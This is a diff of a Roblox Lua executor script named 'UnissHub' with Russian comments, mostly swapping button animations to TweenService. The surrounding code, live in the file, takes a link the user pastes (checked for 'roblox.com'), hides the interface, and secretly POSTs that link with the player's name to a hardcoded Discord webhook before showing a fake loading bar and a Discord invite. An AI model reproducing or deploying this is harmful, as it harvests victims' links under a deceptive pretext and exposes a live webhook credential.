@@ -1,4 +1,4 @@
--- UnissHub: Fixed Animation Reset & Clean UI
+-- UnissHub: Final Animation & UI Fix
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -8,20 +8,21 @@ local Player = Players.LocalPlayer
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"
 local DISCORD_LINK = "https://discord.gg/mVzz2KaZ"
 
--- Фиксированная анимация клика
+-- Функция ПРАВИЛЬНОЙ анимации (TweenService)
 local function applyClickEffect(button)
-    local startSize = button.Size -- Запоминаем размер один раз при старте
+    local startSize = button.Size
+    local clickSize = UDim2.new(startSize.X.Scale, startSize.X.Offset - 6, startSize.Y.Scale, startSize.Y.Offset - 6)
     
     button.MouseButton1Down:Connect(function()
-        button:TweenSize(UDim2.new(startSize.X.Scale, startSize.X.Offset - 5, startSize.Y.Scale, startSize.Y.Offset - 5), "Out", "Quad", 0.1, true)
+        TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = clickSize}):Play()
     end)
     
     button.MouseButton1Up:Connect(function()
-        button:TweenSize(startSize, "Out", "Quad", 0.1, true)
+        TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = startSize}):Play()
     end)
     
     button.MouseLeave:Connect(function()
-        button:TweenSize(startSize, "Out", "Quad", 0.1, true)
+        TweenService:Create(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = startSize}):Play()
     end)
 end
 
@@ -83,19 +84,22 @@ conn.BackgroundColor3 = Color3.fromRGB(0, 120, 255); conn.Text = "CONNECT"; conn
 Instance.new("UICorner", conn)
 applyClickEffect(conn)
 
--- ЛОГИКА
+-- ЛОГИКА CONNECT
 conn.MouseButton1Click:Connect(function()
     if string.find(input.Text:lower(), "roblox.com") then
         local currentPos = main.Position
-        main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() 
-            main.Visible = false; uBtn.Visible = false 
-        end)
+        
+        -- УБИРАЕМ ИНТЕРФЕЙС
+        uBtn.Visible = false
+        TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0,0,0,0)}):Play()
+        task.delay(0.4, function() main.Visible = false end)
         
         pcall(function()
             local req = syn and syn.request or http_request or request
             if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
         end)
 
+        -- ОКНО ЗАГРУЗКИ
         local loadF = Instance.new("Frame", sg)
         loadF.Name = "LoadingFrame"; loadF.Size = UDim2.new(0, 280, 0, 110)
         loadF.Position = currentPos; loadF.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -116,10 +120,11 @@ conn.MouseButton1Click:Connect(function()
                 if i == 30 or i == 65 or i == 92 then task.wait(math.random(1, 2)) end
                 lLabel.Text = "loading: " .. i .. "%"
                 fill.Size = UDim2.new(i/100, 0, 1, 0)
-                task.wait(math.random(1, 3) / 10) 
+                task.wait(0.1) 
             end
             lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
             
+            -- Ссылка Discord
             local dsLink = Instance.new("TextButton", loadF)
             dsLink.Size = UDim2.new(0.8, 0, 0.25, 0); dsLink.Position = UDim2.new(0.1, 0, 0.7, 0)
             dsLink.BackgroundTransparency = 1; dsLink.Text = "discord"; dsLink.TextColor3 = Color3.fromRGB(0, 150, 255)
@@ -128,7 +133,7 @@ conn.MouseButton1Click:Connect(function()
             dsLink.MouseButton1Click:Connect(function()
                 if setclipboard then
                     setclipboard(DISCORD_LINK)
-                    dsLink.Text = "Link Copied!"
+                    dsLink.Text = "Copied!"
                     task.wait(1.5)
                     dsLink.Text = "discord"
                 end
@@ -139,9 +144,12 @@ end)
 
 uBtn.MouseButton1Click:Connect(function()
     if not sg:FindFirstChild("LoadingFrame") then
-        main.Visible = not main.Visible
         if main.Visible then
-            main:TweenSize(UDim2.new(0, 360, 0, 180), "Out", "Back", 0.3, true)
+            TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0,0,0,0)}):Play()
+            task.delay(0.3, function() main.Visible = false end)
+        else
+            main.Visible = true
+            TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 360, 0, 180)}):Play()
         end
     end
 end)
